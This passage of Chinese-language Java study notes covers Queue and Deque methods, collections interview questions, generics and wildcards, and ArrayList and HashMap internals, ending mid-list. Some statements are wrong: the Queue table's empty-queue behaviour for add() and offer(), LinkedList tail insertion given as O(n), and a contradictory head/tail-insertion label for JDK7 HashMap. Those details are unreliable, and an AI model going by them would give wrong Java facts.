<h4 id="队列-Queue"><a href="#队列-Queue" class="headerlink" title="队列 Queue"></a>队列 Queue</h4><p>Java 中的 <code>Queue</code> 接口是一个扩展了 <code>Collection</code> 接口的子接口，通常用于代表一个先进先出的（FIFO）数据结构。<code>Queue</code> 接口常被用作队列数据结构的接口定义，像 <code>LinkedList</code> 和 <code>PriorityQueue</code> 等类都实现了该接口。以下是 <code>Queue</code> 接口中常用的几种方法：</p>
<table>
<thead>
<tr>
<th>方法</th>
<th>描述</th>
<th>当队列为空时的行为</th>
<th>当队列已满时的行为</th>
</tr>
</thead>
<tbody><tr>
<td><code>add(E e)</code></td>
<td>将元素插入队列尾部，插入成功返回 <code>true</code></td>
<td>抛出 <code>NoSuchElementException</code></td>
<td>抛出 <code>IllegalStateException</code></td>
</tr>
<tr>
<td><code>offer(E e)</code></td>
<td>将元素插入队列尾部，插入成功返回 <code>true</code>，失败返回 <code>false</code></td>
<td>返回 <code>false</code></td>
<td>返回 <code>false</code></td>
</tr>
<tr>
<td><code>remove()</code></td>
<td>移除并返回队列头部元素</td>
<td>抛出 <code>NoSuchElementException</code></td>
<td>不适用</td>
</tr>
<tr>
<td><code>poll()</code></td>
<td>移除并返回队列头部元素，失败时返回 <code>null</code></td>
<td>返回 <code>null</code></td>
<td>不适用</td>
</tr>
<tr>
<td><code>element()</code></td>
<td>返回队列头部元素，但不移除</td>
<td>抛出 <code>NoSuchElementException</code></td>
<td>不适用</td>
</tr>
<tr>
<td><code>peek()</code></td>
<td>返回队列头部元素，但不移除，失败时返回 <code>null</code></td>
<td>返回 <code>null</code></td>
<td>不适用</td>
</tr>
</tbody></table>
<h5 id="双端队列-Deque"><a href="#双端队列-Deque" class="headerlink" title="双端队列 Deque"></a>双端队列 Deque</h5><p>Deque（双端队列）是一个接口，它继承自Queue接口，并且提供了在队列的两端进行插入和删除操作的方法。Deque的实现类如ArrayDeque和LinkedList（后者也实现了List接口）都是非常常用的。</p>
<p><strong>插入操作</strong></p>
<ul>
<li><code>addFirst(E e)</code>: 在双端队列的开头添加指定的元素。</li>
<li><code>push(E e)</code>:将元素推送到此双端队列表示的堆栈上。 </li>
<li><code>addLast(E e)</code>: 在双端队列的末尾添加指定的元素。这两个方法等价于offerFirst(E e)和offerLast(E e)，但它们在无法添加元素时会抛出异常。</li>
<li>offerFirst(E e): 在双端队列的开头插入指定的元素（如果可能），并返回true（如果队列没有满），或者false（如果队列已满）。</li>
<li>offerLast(E e): 在双端队列的末尾插入指定的元素（如果可能），并返回true（如果队列没有满），或者false（如果队列已满）。</li>
</ul>
<p><strong>删除操作</strong></p>
<ul>
<li><code>removeFirst()</code>: 移除并返回双端队列的开头元素。如果队列为空，则抛出NoSuchElementException。</li>
<li><code>removeLast()</code>: 移除并返回双端队列的末尾元素。如果队列为空，则抛出NoSuchElementException。</li>
<li><code>pollFirst()</code>: 移除并返回双端队列的开头元素，如果队列为空，则返回null。</li>
<li><code>pollLast()</code>: 移除并返回双端队列的末尾元素，如果队列为空，则返回null。</li>
</ul>
<p><strong>访问操作</strong></p>
<ul>
<li><code>getFirst()</code>: 返回双端队列的开头元素但不移除它。如果队列为空，则抛出NoSuchElementException。</li>
<li><code>getLast()</code>: 返回双端队列的末尾元素但不移除它。如果队列为空，则抛出NoSuchElementException。</li>
<li><code>peekFirst()</code>: 返回双端队列的开头元素，如果队列为空，则返回null。</li>
<li><code>peekLast()</code>: 返回双端队列的末尾元素，如果队列为空，则返回null。</li>
<li><code>pop():</code> 从此双端队列表示的堆栈中弹出一个元素。</li>
</ul>
<p><strong>检查操作</strong></p>
<ul>
<li>isEmpty(): 检查双端队列是否为空。如果队列为空，则返回true；否则返回false。</li>
</ul>
<p><strong>其他操作</strong></p>
<ul>
<li><code>size()</code>: 返回双端队列中的元素数量。</li>
<li>descendingIterator(): 返回在此双端队列元素上按逆序进行迭代的Iterator。</li>
<li>iterator(): 返回在此双端队列元素上进行迭代的Iterator。迭代器提供的是弱一致性的视图，这反映了某一时间点或者迭代开始时的集合状态，它们反映的是弱一致性的视图。</li>
</ul>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>企业真题</p>
<ol>
<li>List，Set，Map是否继承自collection接口？（Map不是。）</li>
<li>说说List,Set,Map三者的区别(集合框架处)</li>
<li>写出list、map、set接口的实现类，并说出其特点（）</li>
<li>常见集合类的区别和适用场景（）</li>
<li>集合的父类是谁？哪些安全的？（不安全：ArrayList、HashMap、HashSet ； 安全：Vector、Hashtable）</li>
<li>集合说一下哪些是线程不安全的（）</li>
<li>遍历集合的方式有哪些？（）<ul>
<li>迭代器Iterator用来遍历Collection，不能用来遍历Map！</li>
<li>增强for</li>
<li>一般的for：可以用来遍历List</li>
</ul>
</li>
<li>List下面有哪些实现（）</li>
<li>ArrayList与LinkedList区别？()</li>
<li>ArrayList与Vector区别呢？为什么要用ArrayList取代Vector呢？(Vector效率低。)</li>
<li>Java.util.ArrayList常用的方法有哪些？（）</li>
<li>Arraylist 是有序还是无序？为什么？（有序；底层使用数组：Object[]）</li>
<li>Set集合有哪些实现类，分别有什么特点？（）</li>
<li>List集合和Set集合的区别？（）</li>
<li>Set里的元素是不能重复的，那么用什么方法来区分重复与否呢? 是用&#x3D;&#x3D;还是equals()? 它们有何区别?（）</li>
<li>TreeSet两种排序方式在使用的时候怎么起作用？（在添加新的元素时，需要调用compareTo() 或 compare()）</li>
<li>TreeSet的数据结构（红黑树）</li>
<li>说一下Java的集合Map有哪些Map？（）</li>
<li>final怎么用，修饰Map可以继续添加数据吗？（可以！final HashMap map &#x3D; new HashMap();map.put(“AA”,123);）</li>
<li>Set和Map的比较（）<br>HashSet底层就是HashMap<br>LinkedHashSet底层就是LinkedHashMap<br>TreeSet底层就是TreeMap</li>
<li>HashMap说一下，线程安全吗？（不安全）</li>
<li>HashMap和Hashbable的区别？()</li>
<li>Hashtable是怎么实现的，为什么线程安全？（数组+单向链表；底层方法使用synchronized修饰）</li>
<li>HashMap和LinkedHashMap的区别（）</li>
<li>HashMap 和 TreeMap 的区别（底层的数据结构截然不同）</li>
<li>HashMap里面实际装的是什么？<br>JDK7：HashMap内部声明了Entry，实现了Map中的Entry接口。（key，value作为Entry的两个属性出现）<br>JDK8：HashMap内部声明了Node，实现了Map中的Entry接口。（key，value作为Node的两个属性出现）</li>
<li>HashMap的key存储在哪里？和value存储在一起吗？那么value存储在哪里？说具体点？（数组+链表+红黑树。 key、value作为Node的属性出现）</li>
<li>自定义类型可以作为Key么？（可以！ 要重写hashCode() 和equals()）</li>
<li>集合类的工具类是谁？用过工具类哪些方法？（Collections）</li>
<li>Collection 和 Collections的区别？（）</li>
<li>ArrayList 如何实现排序（Collections.sort(list) 或 Collections.sort(list,comparator)）</li>
<li>HashMap是否线程安全，怎样解决HashMap的线程不安全（）</li>
</ol>
<hr>
<h3 id="第13章-泛型"><a href="#第13章-泛型" class="headerlink" title="第13章_泛型"></a>第13章_泛型</h3><p>我们在声明方法时，当在完成方法功能时如果有<code>未知的数据</code>需要参与，这些未知的数据需要在调用方法时才能确定，那么我们把这样的数据通过<code>形参</code>表示。在方法体中，用这个形参名来代表那个未知的数据，而调用者在调用时，对应的传入<code>实参</code>就可以了泛型即为“<code>类型参数</code>”，这个类型参数在声明它的类、接口或方法中，代表未知的某种通用类型。</p>
<p>Java泛型可以保证如果程序在编译时没有发出警告，运行时就不会产生ClassCastException异常。即，把不安全的因素在编译期间就排除了，而不是运行期；既然通过了编译，那么类型一定是符合要求的，就避免了类型转换。同时，代码更加简洁、健壮。<br><strong>把一个集合中的内容限制为一个特定的数据类型，这就是generic背后的核心思想。</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//泛型在List中的使用</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//举例：将学生成绩保存在ArrayList中</span></span><br><span class="line">    <span class="comment">//标准写法：</span></span><br><span class="line">    <span class="comment">//ArrayList&lt;Integer&gt; list = new ArrayList&lt;Integer&gt;();</span></span><br><span class="line">    <span class="comment">//jdk7的新特性：类型推断</span></span><br><span class="line">    ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">//实例化时指明类的泛型参数的类型</span></span><br><span class="line"></span><br><span class="line">    list.add(<span class="number">56</span>); <span class="comment">//自动装箱</span></span><br><span class="line">    list.add(<span class="number">89</span>);</span><br><span class="line">    <span class="comment">//当添加非Integer类型数据时，编译不通过，没有规定泛型时会编译通过，运行时强转报错</span></span><br><span class="line">    <span class="comment">//list.add(&quot;Tom&quot;);//编译报错</span></span><br><span class="line"></span><br><span class="line">    Iterator&lt;Integer&gt; iterator = list.iterator();</span><br><span class="line">    <span class="keyword">while</span>(iterator.hasNext())&#123;</span><br><span class="line">        <span class="comment">//不需要强转，直接可以获取添加时的元素的数据类型</span></span><br><span class="line">        <span class="type">Integer</span> <span class="variable">score</span> <span class="operator">=</span> iterator.next();</span><br><span class="line">        System.out.println(score);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Set&lt;Map.Entry&lt;String, Integer&gt;&gt; entrySet = map.entrySet();</span><br><span class="line">Iterator&lt;Map.Entry&lt;String, Integer&gt;&gt; iterator1 = entrySet.iterator();</span><br></pre></td></tr></table></figure>

<p><strong>使用说明</strong></p>
<ol>
<li>集合框架在声明接口和其实现类时，使用了泛型，在实例化集合对象时，如果没有使用泛型，则认为操作的是Object类型的数据，如果使用了泛型，则需要指定泛型的具体类型，此后凡是使用类的泛型的位置，都(自动)替换为具体的泛型类型</li>
<li>泛型参数只能被指明为引用数据类型，基本数据类型需要使用包装类替代</li>
<li>如果在创建自定义泛型类的对象时，没有指明泛型参数类型，那么泛型将被擦除，泛型对应的类型均按照Object处理，但不等价于Object。<strong>泛型要使用一路都用。要不用，一路都不要用</strong></li>
<li>除创建泛型类对象外，子类继承泛型类时、实现类实现泛型接口时，也可以确定泛型结构中的泛型参数。</li>
</ol>
<p><strong>注意</strong></p>
<ol>
<li>泛型类可能有多个参数，此时应将多个参数一起放在尖括号内。比如：&lt;E1,E2,E3&gt;</li>
<li>JDK7.0 开始，泛型的简化操作：ArrayList<Fruit> flist &#x3D; new ArrayList&lt;&gt;();</li>
<li>如果泛型结构是一个接口或抽象类，则不可创建泛型类的对象。（接口和抽象类不能实例化）</li>
<li>不能使用new E[]。但是可以：E[] elements &#x3D; (E[])new Object[capacity];<br>参考：ArrayList源码中声明：Object[] elementData，而非泛型参数类型数组。</li>
<li>在类&#x2F;接口上声明的泛型，在本类或本接口中即代表某种类型，但不可以在静态方法中使用类的泛型。</li>
<li>异常类不能是带泛型的。</li>
</ol>
<hr>
<h4 id="自定义泛型结构"><a href="#自定义泛型结构" class="headerlink" title="自定义泛型结构"></a>自定义泛型结构</h4><p>自定义类如果没有在声明时声明为泛型类，就不能使用泛型。</p>
<p><strong>自定义泛型类&#x2F;接口</strong></p>
<p>格式：<code>class A&lt;T&gt;&#123;&#125;</code></p>
<ol>
<li>声明类的泛型参数后即可在类内部使用此泛型参数，用以声明属性、方法、构造器等</li>
<li>泛型类在使用时也可以不指明泛型类型，默认为Object(向下兼容)<br>但不等价与指定泛型参数为Object的操作</li>
<li>泛型参数只能被指明为引用数据类型，基本数据类型需要使用包装类替代</li>
<li>泛型类被继承时，如果子类没有<code>&lt;&gt;</code>符，默认指定父类的泛型参数类型为<code>Object</code>;</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GenericTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Order&lt;Integer&gt; order = <span class="keyword">new</span> <span class="title class_">Order</span>&lt;&gt;(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//泛型类在使用时也可以不指明泛型类型，默认为Object(向下兼容)</span></span><br><span class="line">        <span class="comment">//泛型参数只能被指明为引用数据类型，基本数据类型需要使用包装类替代</span></span><br><span class="line">        <span class="type">Order</span> <span class="variable">order1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Order</span>(Integer.valueOf(<span class="number">1</span>),<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Order</span>&lt;T&gt;&#123;</span><br><span class="line">    T t;</span><br><span class="line">    <span class="type">int</span> orderId;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Order</span><span class="params">()</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Order</span><span class="params">(T t, <span class="type">int</span> orderId)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.t = t;</span><br><span class="line">        <span class="built_in">this</span>.orderId = orderId;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">getT</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> t;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setT</span><span class="params">(T t)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.t = t;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//二者均不是泛型方法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">OrderSon</span> <span class="keyword">extends</span> <span class="title class_">Order</span>&#123;</span><br><span class="line">    <span class="comment">//默认指定父类Order的泛型参数类型为Object，此子类不是泛型类</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">OrderSon1</span> <span class="keyword">extends</span> <span class="title class_">Order</span>&lt;Integer&gt;&#123;</span><br><span class="line">    <span class="comment">//指定父类Order的泛型参数类型为Integer，此子类不是泛型类</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">OrderSon2</span>&lt;T&gt; <span class="keyword">extends</span> <span class="title class_">Order</span>&lt;T&gt;&#123;</span><br><span class="line">    <span class="comment">//此子类也是泛型类，父类的泛型参数未被指定</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">OrderSon3</span>&lt;T&gt; <span class="keyword">extends</span> <span class="title class_">Order</span>&lt;Integer&gt;&#123;</span><br><span class="line">    <span class="comment">//此子类也是泛型类，指定父类Order的泛型参数类型为Integer,自身还有一个泛型参数</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">OrderSon4</span>&lt;T,E&gt; <span class="keyword">extends</span> <span class="title class_">Order</span>&lt;T&gt;&#123;</span><br><span class="line">    <span class="comment">//此子类也是泛型类，父类的泛型参数未被指定,自身还有一个泛型参数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p><strong>自定义泛型方法</strong></p>
<p>格式：<code>权限修饰符 &lt;T&gt; 返回值类型 方法名(形参列表)&#123;&#125;</code></p>
<p>说明：</p>
<ul>
<li>方法，也可以被泛型化，与其所在的类是否是泛型类没有关系。</li>
<li>泛型方法中的泛型参数在方法被调用时确定。</li>
<li>泛型方法可以根据需要，声明为static的。</li>
</ul>
<p>示例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//编写一个泛型方法，接收一个任意引用类型的数组，并反转数组中的所有元素</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;E&gt; <span class="keyword">void</span> <span class="title function_">method1</span><span class="params">( E[] arr)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> <span class="number">0</span>,max = arr.length - <span class="number">1</span>;min &lt; max; min++,max--)&#123;</span><br><span class="line">        <span class="type">E</span> <span class="variable">temp</span> <span class="operator">=</span> arr[min];</span><br><span class="line">        arr[min] = arr[max];</span><br><span class="line">        arr[max] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="泛型的继承"><a href="#泛型的继承" class="headerlink" title="泛型的继承"></a>泛型的继承</h4><p>如果B是A的一个子类型（子类或者子接口），而G是具有泛型声明的类或接口，<code>G&lt;B&gt;</code>并不是<code>G&lt;A&gt;</code>的子类型！<br>如果superA是A的父类型，superA<code>&lt;G&gt;</code> 与 A<code>&lt;G&gt;</code>有继承或实现的关系，即A<code>&lt;G&gt;</code>的实例可以通过多态赋值给superA<code>&lt;G&gt;</code>的实例<br>比如：String是Object的子类，但是List<code>&lt;String&gt;</code>并不是List<code>&lt;Object&gt;</code>的子类。<br>&#x3D;&#x3D;》否则出现语言逻辑冲突</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;aa&quot;</span>;</span><br><span class="line"></span><br><span class="line">    obj = str;</span><br><span class="line">    <span class="comment">// String是Object的子类，由于多态，此语句无报错</span></span><br><span class="line"></span><br><span class="line">    ArrayList&lt;Object&gt; list1 = <span class="literal">null</span>;</span><br><span class="line">    ArrayList&lt;String&gt; list2 = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">//以下语句会报错</span></span><br><span class="line">    <span class="comment">//list1 = list2</span></span><br><span class="line"></span><br><span class="line">    Person&lt;String&gt; perS = <span class="literal">null</span>;</span><br><span class="line">    Person&lt;Object&gt; perO = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">//以下语句同样报错</span></span><br><span class="line">    <span class="comment">//perO = perS;</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&lt;T&gt;&#123;</span><br><span class="line">    String name;</span><br><span class="line">    T t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h4 id="通配符-的使用"><a href="#通配符-的使用" class="headerlink" title="通配符?的使用"></a>通配符<code>?</code>的使用</h4><p>当我们声明一个变量&#x2F;形参时，这个变量&#x2F;形参的类型是一个泛型类或泛型接口，例如：Comparator<T>类型，但是我们仍然无法确定这个泛型类或泛型接口的类型变量<T>的具体类型，此时我们考虑使用类型通配符 ? 。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    List&lt;?&gt; list = <span class="literal">null</span>;</span><br><span class="line">    List&lt;Object&gt; list1 = <span class="literal">null</span>;</span><br><span class="line">    List&lt;String&gt; list2 = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    list2.add(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">    list = list2;</span><br><span class="line">    <span class="comment">//list = list1;//均可正确</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//String str = list.get(0);</span></span><br><span class="line">    <span class="comment">// 不可编译通过，返回值类型为E,，而我们没有确定泛型指定的数据类型</span></span><br><span class="line">    <span class="comment">// 因此，返回值为默认类型即Object</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> list.get(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">//list.add(&quot;BB&quot;);</span></span><br><span class="line">    <span class="comment">//不可编译通过，因为不确定集合的类型（？），但添加null可以通过</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">mothod</span><span class="params">(List&lt;?&gt; list)</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>写操作：</strong><br>将任意元素加入到其中不是类型安全的：因为我们不知道元素类型，我们不能向其中添加对象。add方法有类型参数E作为集合的元素类型。我们传给add的任何参数都必须是一个未知类型的子类。因为我们不知道那是什么类型，所以我们无法传任何东西进去。唯一可以插入的元素是null，因为它是所有引用类型的默认值。</p>
<p><strong>读操作：</strong><br>另一方面，读取List&lt;?&gt;的对象list中的元素时，永远是安全的，因为不管 list 的真实类型是什么，它包含的都是Object。</p>
<p><strong>注意</strong></p>
<ol>
<li>编译错误：不能用在泛型方法声明上，返回值类型前面&lt;&gt;不能使用?<br><code>public static &lt;?&gt; void test(ArrayList&lt;?&gt; list)&#123;&#125;</code></li>
<li>编译错误：不能用在泛型类的声明上<br><code>class GenericTypeClass&lt;?&gt;&#123;&#125;</code></li>
<li>编译错误：不能用在创建对象上，右边属于创建集合对象<br><code>ArrayList&lt;?&gt; list2 = new ArrayList&lt;?&gt;();</code></li>
</ol>
<p><strong>有限制的通配符</strong></p>
<ul>
<li><code>&lt;?&gt;</code><ul>
<li>允许所有泛型的引用调用</li>
</ul>
</li>
<li>通配符指定上限：<code>&lt;? extends 类/接口 &gt;</code><ul>
<li>使用时指定的类型必须是继承某个类，或者实现某个接口，即&lt;&#x3D;</li>
</ul>
</li>
<li>通配符指定下限：<code>&lt;? super 类/接口 &gt;</code><ul>
<li>使用时指定的类型必须是操作的类或接口，或者是操作的类的父类或接口的父接口，即&gt;&#x3D;</li>
</ul>
</li>
</ul>
<p><strong>说明：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;? <span class="keyword">extends</span> <span class="title class_">Number</span>&gt;     <span class="comment">//(无穷小 , Number]</span></span><br><span class="line"><span class="comment">// 具体的类型可以是此区间中任意,因此写入不可，因为具体类型可能是写入类型更小的类</span></span><br><span class="line"><span class="comment">// 可读不可写（除null外），读的类型为Number</span></span><br><span class="line"><span class="comment">//只允许泛型为Number及Number子类的引用调用</span></span><br><span class="line">&lt;? <span class="built_in">super</span> Number&gt;      <span class="comment">//[Number , 无穷大)</span></span><br><span class="line"><span class="comment">// 可读亦可写，读的类型为Object，写不可写Object</span></span><br><span class="line"><span class="comment">//只允许泛型为Number及Number父类的引用调用</span></span><br><span class="line">&lt;? <span class="keyword">extends</span> <span class="title class_">Comparable</span>&gt;</span><br><span class="line"><span class="comment">//只允许泛型为实现Comparable接口的实现类的引用调用</span></span><br></pre></td></tr></table></figure>


<hr>
<h3 id="第14章-数据结构与集合源码"><a href="#第14章-数据结构与集合源码" class="headerlink" title="第14章_数据结构与集合源码"></a>第14章_数据结构与集合源码</h3><p>一、数据间逻辑关系<br>数据的逻辑结构指反映数据元素之间的逻辑关系，而与数据的存储无关，是独立于计算机的。</p>
<ul>
<li><strong>集合结构</strong>：数据结构中的元素之间除了“<code>同属一个集合</code>” 的相互关系外，别无其他关系。集合元素之间没有逻辑关系。</li>
<li><strong>线性结构</strong>：数据结构中的元素存在<code>一对一</code>的相互关系。比如：排队。结构中必须存在唯一的首元素和唯一的尾元素。体现为：一维数组、链表、栈、队列</li>
<li><strong>树形结构</strong>：数据结构中的元素存在<code>一对多</code>的相互关系。比如：家谱、文件系统、组织架构</li>
<li><strong>图形结构</strong>：数据结构中的元素存在<code>多对多</code>的相互关系。比如：全国铁路网、地铁图</li>
</ul>
<p>二、数据的存储结构（或物理结构）<br>数据的物理结构&#x2F;存储结构：包括<code>数据元素的表示</code>和<code>关系的表示</code>。数据的存储结构是逻辑结构用计算机语言的实现，它依赖于计算机语言。</p>
<p><strong>结构1：顺序结构</strong></p>
<ul>
<li>顺序结构就是使用一组连续的存储单元依次存储逻辑上相邻的各个元素。</li>
<li>优点： 只需要申请存放数据本身的内存空间即可，支持下标访问，也可以实现随机访问。</li>
<li>缺点： 必须静态分配连续空间，内存空间的利用率比较低。插入或删除可能需要移动大量元素，效率比较低</li>
</ul>
<p><strong>结构2：链式结构</strong></p>
<ul>
<li>不使用连续的存储空间存放结构的元素，而是为每一个元素构造一个节点。节点中除了存放数据本身以外，还需要存放指向下一个节点的指针。</li>
<li>优点：不采用连续的存储空间导致内存空间利用率比较高，克服顺序存储结构中预知元素个数的缺点。插入或删除元素时，不需要移动大量的元素。</li>
<li>缺点：需要额外的空间来表达数据之间的逻辑关系，不支持下标访问和随机访问。</li>
</ul>
<p><strong>结构3：索引结构</strong></p>
<ul>
<li>除建立存储节点信息外，还建立附加的<code>索引表</code>来记录每个元素节点的地址。索引表由若干索引项组成。索引项的一般形式是：（关键字，地址）。</li>
<li>优点：用节点的索引号来确定结点存储地址，检索速度快。</li>
<li>缺点： 增加了附加的索引表，会占用较多的存储空间。在增加和删除数据时要修改索引表，因而会花费较多的时间。</li>
</ul>
<p><strong>结构4：散列结构</strong></p>
<ul>
<li>根据元素的关键字直接计算出该元素的存储地址，又称为Hash存储。</li>
<li>优点：检索、增加和删除结点的操作都很快。</li>
<li>缺点：不支持排序，一般比用线性表存储需要更多的空间，并且记录的关键字不能重复。</li>
</ul>
<p>三、运算结构</p>
<p>施加在数据上的运算包括运算的定义和实现。运算的定义是针对逻辑结构的，指出运算的功能；运算的实现是针对存储结构的，指出运算的具体操作步骤。</p>
<ul>
<li>分配资源，建立结构，释放资源</li>
<li>插入和删除</li>
<li>获取和遍历</li>
<li>修改和排序</li>
</ul>
<hr>
<h4 id="List接口分析"><a href="#List接口分析" class="headerlink" title="List接口分析"></a>List接口分析</h4><p><strong>ArrayList</strong></p>
<p>JDK&lt;&#x3D;7和JDK&gt;&#x3D;8对比</p>
<ol>
<li>JDK7: 两个构造器，一个无参构造器默认初始化容量为10的数组，一个有1参构造器默认初始化容量为参数（不能&lt;0）的数组<br>JDK8: 两个构造器，一个无参构造器初始化长度为0数组；在添加(add)第一个元素时重新初始化为容量为10的数组</li>
<li>当添加第11个元素时，需要扩容，默认扩容为原来容量的1.5倍</li>
</ol>
<p><strong>Vector</strong></p>
<ol>
<li>两个构造器，一个无参构造器默认初始化容量为10的数组，一个有1参构造器默认初始化容量为参数（不能&lt;0）的数组。当添加第11个元素时，需要扩容，默认扩容为原来容量的2倍（jdk&#x3D;8(1.8.0_271)）</li>
</ol>
<p><strong>LinkedList</strong></p>
<p>底层为链表，不需要扩容，构造器基本没有工作</p>
<p><strong>开发建议</strong></p>
<ol>
<li>ArrayList底层使用数组结构，查找，尾部添加操作效率高，时间复杂度是O(1); 删除和插入操作效率低，为O(n);<br>LinkedList底层使用双向链表结构，查找，尾部添加操作效率低，时间复杂度是O(n); 删除和插入操作效率高，为O(1);</li>
<li>选择ArrayList时，若已知集合大小，应当有参构造器ArrayList(initialCapacity)</li>
</ol>
<hr>
<h4 id="Map接口分析"><a href="#Map接口分析" class="headerlink" title="Map接口分析"></a>Map接口分析</h4><p><strong>HashMap</strong></p>
<p><strong>JDK7</strong></p>
<ol>
<li>创建对象的过程中，底层会初始化Entry(jdk8是Node)类数组Entry[] table，默认容量为16;<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Entry</span>&lt;K,V&gt; <span class="keyword">implements</span> <span class="title class_">Map</span>.Entry&lt;K,V&gt; &#123;</span><br><span class="line">    <span class="keyword">final</span> K key;</span><br><span class="line">    V value;</span><br><span class="line">    Entry&lt;K,V&gt; next;</span><br><span class="line">    <span class="type">int</span> hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>(重点)添加&#x2F;修改过程：<ul>
<li>（过程）将(key1,value1)添加到当前map中，过程如下<ol>
<li>调用key1所在类的hashCode()方法，计算key1对应的哈希值1</li>
<li>此哈希值1经过某种算法(hash())之后，得到哈希值2</li>
<li>哈希值2再经过某种算法(indexFor())之后，确定了(key1,value1)在数组table中的索引位置i</li>
<li>如果数组索引为i的位置上没有元素，则(key1,value1)添加成功  <strong>情况1</strong><br>如果数组索引为i的位置上有元素(key2,value2)，则继续比较key1和key2的哈希值2  —-&gt; 哈希冲突</li>
<li>如果key1的哈希值2和key2的哈希值2不相同，则(key1,value1)添加成功  <strong>情况2</strong><br>如果key1的哈希值2和key2的哈希值2相同，则调用key1的equals()方法，执行key1.equals(key2);</li>
<li>如果方法返回false，则(key1,value1)添加成功  <strong>情况3</strong><br>如果方法返回true，则认为key1和key2相同，<strong>默认使用value1替换value2</strong></li>
</ol>
</li>
<li>（存储）情况2，3下，Java会使(key1,value1)和现有(key2,value2)构成单向链表结构，(key1,value1)指向(key2,value2)（头插法）</li>
<li>（扩容）当元素的个数达到临界值(默认12)(数组长度16*加载因子0.75)且当前添加的元素必须添加到链表而非数组中时（即满足(size &gt;&#x3D; threshold)&amp;&amp;(null !&#x3D; table[i])）时，会扩容，默认扩容为原来的2倍</li>
<li>null默认添加到角标为0的数组位置。</li>
</ul>
</li>
</ol>
<p><strong>jdk7与jdk8对比</strong></p>
<ol>
<li>JDK8中，当我们创建了HashMap实例后，底层不会初始化table数组，当首次添加(key1,value1)时，如果发现table尚未初始化，则进行初始化</li>
<li>JDK8中，HashMap底层定义了Node内部类，替换jdk7中的Entry内部类，因此是Node数组</li>
<li>JDK8中，如果当前的(key,value)可以添加到下标为i的数组位置而此位置已经有元素，则旧的元素指向新的元素（jdk7是新指向旧(尾插法)）</li>
<li>jdk7: 数组+单向链表  jdk8:数组+单向链表+红黑树<ul>
